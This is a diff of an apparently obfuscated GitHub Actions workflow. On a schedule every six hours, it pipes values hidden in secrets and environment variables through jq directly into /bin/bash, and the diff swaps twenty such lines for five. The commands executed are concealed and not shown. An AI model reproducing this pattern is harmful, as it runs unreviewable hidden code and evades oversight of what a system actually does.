@@ -3,7 +3,7 @@ name: zhangcongrong6247
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '26 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,26 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangcongrong6247
         env:
-          sc2815: ${{ secrets.sc2815 }}
+          e112: ${{ secrets.e112 }}
         run: |
-          echo $sc2815 | jq -r .z08759 | /bin/bash
-          echo $o7 | jq -r .vn9 | /bin/bash
-          echo $stpq39410 | jq -r .c83910 | /bin/bash
-          echo $ttg82700 | jq -r .jc924 | /bin/bash
-          echo $zhxt06 | jq -r .fwom8847 | /bin/bash
-          echo $t6 | jq -r .zpqq5399 | /bin/bash
-          echo $akkgi77 | jq -r .lncfs5294 | /bin/bash
-          echo $nw84841 | jq -r .sa79817 | /bin/bash
-          echo $a18 | jq -r .v13 | /bin/bash
-          echo $ftxl4203 | jq -r .eb34 | /bin/bash
-          echo $qzgsc11 | jq -r .tko241 | /bin/bash
-          echo $ozyfr30068 | jq -r .dmkn4 | /bin/bash
-          echo $y5164 | jq -r .hrgdz31 | /bin/bash
-          echo $x7478 | jq -r .eapjo9532 | /bin/bash
-          echo $o43669 | jq -r .xun2 | /bin/bash
-          echo $yn446 | jq -r .geq76347 | /bin/bash
-          echo $btbzu1234 | jq -r .i2746 | /bin/bash
-          echo $jzmp630 | jq -r .czvc04772 | /bin/bash
-          echo $ctf33933 | jq -r .yjsdx65 | /bin/bash
-          echo $ex06229 | jq -r .ybaxa506 | /bin/bash
+          echo $e112 | jq -r .p8 | /bin/bash
+          echo $qq1159 | jq -r .bkpd912 | /bin/bash
+          echo $ii47 | jq -r .sbtgt5 | /bin/bash
+          echo $cjc0127 | jq -r .x8 | /bin/bash
+          echo $o3 | jq -r .ajwm69021 | /bin/bash
 
